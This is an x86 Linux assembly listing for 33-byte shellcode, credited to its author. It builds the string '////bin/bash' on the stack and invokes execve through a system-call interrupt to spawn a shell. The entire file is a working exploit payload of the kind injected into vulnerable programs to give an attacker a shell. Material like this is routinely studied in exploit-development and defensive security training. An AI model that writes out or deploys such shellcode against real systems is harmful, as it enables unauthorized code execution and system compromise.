;Simple Execve /bin/bash Linux Shellcode x86 - Snir Levi  ©
;Shellcode Length - 33 Bytes

global _start

section .text

_start:
	xor ebx,ebx
	xor ecx,ecx
	
	push ebx
	push 0x68736162;	////bin/bash
	push 0x2f6e6962
	push 0x2f2f2f2f
	
	mov edx,ebx
	mov ebx,esp
	push ecx
	mov ecx,esp
	
	xor eax,eax
	mov al,0xb
	int 0x80


